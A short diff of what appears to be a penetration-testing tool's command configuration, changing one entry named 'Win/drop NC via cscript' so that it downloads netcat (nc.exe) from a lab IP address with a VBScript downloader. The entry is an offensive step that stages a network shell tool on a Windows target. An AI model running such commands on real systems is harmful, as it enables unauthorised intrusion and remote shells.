@@ -57,7 +57,7 @@
       name = Win/download wget.vbs via ftp
       position = 15
     [[[Win/drop NC via cscript]]]
-      command = cscript wget.vbs http://10.11.0.245/netcat/nc.exe nc.exe
+      command = cscript wget.vbs http://10.11.0.245/nc.exe nc.exe
       enabled = True
       name = Win/drop NC via cscript
       position = 10
